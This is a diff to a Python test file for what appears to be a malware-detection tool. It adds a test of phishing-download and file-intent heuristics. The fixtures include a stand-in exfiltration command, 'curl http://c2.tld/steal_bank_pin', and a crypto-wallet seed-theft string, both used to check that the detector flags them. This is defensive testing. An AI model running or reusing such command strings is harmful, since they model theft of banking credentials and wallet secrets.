@@ -11,8 +11,13 @@ if SRC_DIR not in sys.path:
 
 from agent.full_system_scanner import FullSystemGuardian  # noqa: E402
 from agent.guardian_daemon_24x7 import CogniGuard24x7Daemon  # noqa: E402
-from agent.heuristics import evaluate_filename_risk, is_disguised_executable  # noqa: E402
+from agent.heuristics import (  # noqa: E402
+    evaluate_download_risk,
+    evaluate_filename_risk,
+    is_disguised_executable,
+)
 from agent.honeypot_trap import CogniGuardHoneypot  # noqa: E402
+from agent.reverse_engineer import IntentReverseEngineer  # noqa: E402
 from agent.storage import CogniGuardStore  # noqa: E402
 
 
@@ -95,3 +100,22 @@ def test_honeypot_deploy_and_daemon_detection(tmp_path, capsys):
     assert len(logs) == 1
     assert logs[0]["filename"] == "dropped_stealer.exe"
     assert logs[0]["verdict"] == "INTRUSION_DETECTED"
+
+
+def test_phishing_download_and_reverse_engineer():
+    phishing = evaluate_download_risk("update.pdf", "https://binance-verify.example/update.pdf")
+    assert phishing["verdict"] == "INTRUSION_DETECTED"
+    assert evaluate_filename_risk("loader.jar")["verdict"] == "INTRUSION_DETECTED"
+
+    eng = IntentReverseEngineer()
+    bank = eng.analyze_file_intent(b"curl http://c2.tld/steal_bank_pin", "invoice.vbs")
+    assert bank["primary_target"] == "BANK_CREDENTIALS"
+    assert bank["recommended_action"] == "SHRED_AND_DELETE"
+
+    crypto = eng.analyze_file_intent(b"read metamask seed mnemonic", "helper.py")
+    assert crypto["primary_target"] == "CRYPTO_WALLET"
+
+    clean = eng.analyze_file_intent(b"print('hello world')", "readme.txt")
+    assert clean["primary_target"] == "NONE"
+    assert clean["recommended_action"] == "ALLOW"
+    assert clean["threat_score"] == 0.05
